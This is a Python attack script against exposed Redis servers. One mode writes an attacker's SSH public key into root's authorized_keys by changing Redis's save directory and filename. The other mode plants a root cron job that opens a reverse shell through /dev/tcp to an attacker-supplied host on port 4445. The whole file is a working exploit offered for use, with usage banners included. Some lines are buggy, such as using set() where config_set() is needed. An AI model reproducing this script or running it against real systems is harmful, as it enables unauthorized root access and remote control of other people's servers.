#! /usr/bin/env python3
# -*- coding:UTF-8 -*-

import redis
from colorama import init, Fore
import argparse
import string
import random


class Credentials:
    def __init__(self, host,port,password,lhost,key):
        self.host = host
        self.password = password
        self.port= port
        self.lhost = lhost
        try:
            self.key = '\n\n\n'+open(key,"r").readline()+'\n\n\n'
        except:
            self.key = ''

class exploit:

    def __init__(self,credentials):
        self.credentials = credentials
        self.sshsucess = "Write success, SSH public key can be directly connected."
        self.cronsuess = "Write success, Timing task needs to listen to port 4445。"
        self.error = "Failed to write,Permission denied。"

    def str_random(self):
        return (''.join(random.sample(string.ascii_letters + string.digits, 8)))

    def print_success(self,message):
        print(Fore.GREEN + " [+] " + Fore.RESET + message)

    def print_error(self,message):
        print(Fore.RED + " [+] " + Fore.RESET + message)

    def connect(self):
        ret = redis.Redis(host=self.credentials.host, port=self.credentials.port,
                          password=self.credentials.password)
        return ret

    def version(self,connect):
        connect = self.connect()
        print("Current redis version" + connect.info()['redis_version'])
        print("Current system version" + connect.info()['os'])

    def sshcheck(self):
        try:
            connect = self.connect()
            self.version(connect)
            connect.set(self.str_random(), self.credentials.key)
            connect.set('dir','/root/.ssh')
            connect.set('dbfilename','authorized_keys')
            connect.save()
            self.print_success(self.sshsucess)
        except Exception as e:
            self.print_error(self.error)

    def croncheck(self):
        try:
            connect = self.connect()
            connect.flushall()
            self.version(connect)
            connect.set(self.str_random(),'\n\n*/1 * * * * '
                                          '/bin/bash -i>&/dev/tcp/{lhost}/4445 0>&1\n\n'
                        .format(lhost=credentials.lhost))
            connect.config_set('dir','/var/spool/cron')
            # connect.config_set('dbfilename','root')
            connect.save()
            self.print_success(self.cronsuess)
        except:
            self.print_error(self.error)



if __name__ == '__main__':
    parse = argparse.ArgumentParser(description="fuckredis")
    parse.add_argument('-t', '--host', type=str, help="host")
    parse.add_argument('-p', '--port', type=str, help="ssh key",default='6379')
    parse.add_argument('-w', '--password', type=str, help="password",default='')
    parse.add_argument('-k', '--key', type=str, help="ssh key",default='')
    parse.add_argument('-c', '--lhost', type=str, help="lhost",default='')
    args = parse.parse_args()
    host = args.host
    password = args.password
    key = args.key
    lhost = args.lhost
    port = args.port
    credentials = Credentials(host=host, password = password,port=port,lhost=lhost,key=key)
    check = exploit(credentials)
    if not host:
        print("""
#############################################################
## @author  c1y2m3                                         ##
## SSH public key used: redisexpolit.py -t 192.168.1.1 -k id_rsa.pub
## Cron task used: redisexpolit.py -t 192.168.1.1 -c rhost    ##
#############################################################""")
        exit()
    if not args.key:
        check.croncheck()
    else:
        check.sshcheck()
